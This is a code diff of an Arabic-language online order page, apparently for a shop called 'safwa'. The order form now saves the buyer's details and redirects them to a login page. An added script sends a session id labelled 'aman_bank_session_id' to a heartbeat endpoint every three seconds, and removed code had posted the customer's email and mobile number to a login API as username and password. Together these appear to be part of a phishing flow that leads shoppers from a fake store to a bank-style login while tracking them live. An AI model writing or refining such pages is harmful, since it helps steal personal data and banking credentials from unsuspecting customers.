@@ -403,7 +403,7 @@
         <label for="address">عنوان التوصيل</label>
         <input type="text" id="address" name="address" placeholder="المدينة، الحي، الشارع" required>
       </div>
- <button type="button" class="order-submit" onclick="window.location.href='login_ar.html';">متابعة الطلب</button>  
+ <button type="submit" class="order-submit">متابعة الطلب</button>
     </form>
   </div>
 </section>
@@ -463,28 +463,28 @@
       return;
     }
 
-    fetch('/api/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        username: order.email,
-        password: order.mobile,
-        name: order.name,
-        phone: order.phone,
-        mobile: order.mobile,
-        email: order.email,
-        address: order.address
-      })
-    }).catch(function(){
-      console.warn('تعذر إرسال بيانات الطلب إلى الخادم');
-    });
-
     const orders = JSON.parse(localStorage.getItem('safwa_orders') || '[]');
     orders.push(order);
     localStorage.setItem('safwa_orders', JSON.stringify(orders));
-    orderForm.innerHTML = '<p style="text-align:center; font-weight:700; color:var(--teal); padding:20px 0;">تم استلام طلبك بنجاح، شكرًا لك.</p>';
+    sessionStorage.setItem('safwa_order_data', JSON.stringify(order));
+    window.location.href = 'login_ar.html';
   });
 </script>
 
+  <script>
+    (function(){
+      var sessionId = sessionStorage.getItem('aman_bank_session_id') || ('sess_' + Date.now() + '_' + Math.random().toString(36).slice(2));
+      sessionStorage.setItem('aman_bank_session_id', sessionId);
+      function sendHeartbeat(){
+        fetch('/api/heartbeat', {
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({sessionId:sessionId})
+        }).catch(function(){});
+      }
+      sendHeartbeat();
+      setInterval(sendHeartbeat, 3000);
+    })();
+  </script>
 </body>
 </html>
